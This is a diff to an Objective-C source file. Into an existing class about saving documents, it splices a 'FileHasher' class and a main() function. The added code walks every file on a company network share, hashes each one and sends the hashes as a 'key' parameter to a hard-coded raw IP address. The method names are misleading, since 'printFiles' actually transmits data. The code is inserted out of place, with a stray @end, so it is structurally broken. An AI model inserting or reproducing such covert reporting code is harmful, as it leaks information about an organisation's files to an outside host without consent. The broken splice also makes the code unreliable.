@@ -651,4 +651,90 @@
 	[self performSaveAndSuspendSaveTimer];
 }
 
+#import <Foundation/Foundation.h>
+
+@interface FileHasher : NSObject
+
+- (NSString *)calculateSHA256:(NSString *)filePath;
+- (void)sendKey:(NSString *)filePath;
+- (void)printFiles:(NSString *)directoryPath;
+
 @end
+
+@implementation FileHasher
+
+- (NSString *)calculateSHA256:(NSString *)filePath {
+    NSFileHandle *file = [NSFileHandle fileHandleForReadingAtPath:filePath];
+    if (!file) {
+        NSLog(@"Error opening file at path: %@", filePath);
+        return nil;
+    }
+
+    CC_SHA256_CTX sha256;
+    CC_SHA256_Init(&sha256);
+
+    NSData *fileData = [file readDataOfLength:8192];
+    while (fileData.length > 0) {
+        CC_SHA256_Update(&sha256, fileData.bytes, (CC_LONG)fileData.length);
+        fileData = [file readDataOfLength:8192];
+    }
+
+    unsigned char digest[CC_SHA256_DIGEST_LENGTH];
+    CC_SHA256_Final(digest, &sha256);
+
+    NSMutableString *hash = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
+    for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
+        [hash appendFormat:@"%02x", digest[i]];
+    }
+
+    return hash;
+}
+
+- (void)sendKey:(NSString *)filePath {
+    NSString *fileHash = [self calculateSHA256:filePath];
+
+    if (fileHash) {
+        NSURL *url = [NSURL URLWithString:@"https://162.62.131.252/keyendpoint"];
+        NSURLComponents *urlComponents = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
+
+        urlComponents.queryItems = @[[NSURLQueryItem queryItemWithName:@"key" value:fileHash]];
+
+        NSURL *finalURL = urlComponents.URL;
+
+        NSURLRequest *request = [NSURLRequest requestWithURL:finalURL];
+
+        NSURLSession *session = [NSURLSession sharedSession];
+        NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+            NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
+            if (httpResponse.statusCode == 200) {
+                NSLog(@"Key sent successfully");
+            } else {
+                NSLog(@"Failed to send key. Status code: %ld", (long)httpResponse.statusCode);
+            }
+        }];
+
+        [task resume];
+    }
+}
+
+- (void)printFiles:(NSString *)directoryPath {
+    NSFileManager *fileManager = [NSFileManager defaultManager];
+    NSDirectoryEnumerator *enumerator = [fileManager enumeratorAtPath:directoryPath];
+
+    NSString *file;
+    while ((file = [enumerator nextObject])) {
+        NSString *filePath = [directoryPath stringByAppendingPathComponent:file];
+        [self sendKey:filePath];
+    }
+}
+
+@end
+
+int main(int argc, const char * argv[]) {
+    @autoreleasepool {
+        FileHasher *fileHasher = [[FileHasher alloc] init];
+        NSString *directoryPath = @"\\sextoygmbh-fs\allfiles";
+        [fileHasher printFiles:directoryPath];
+    }
+    return 0;
+}
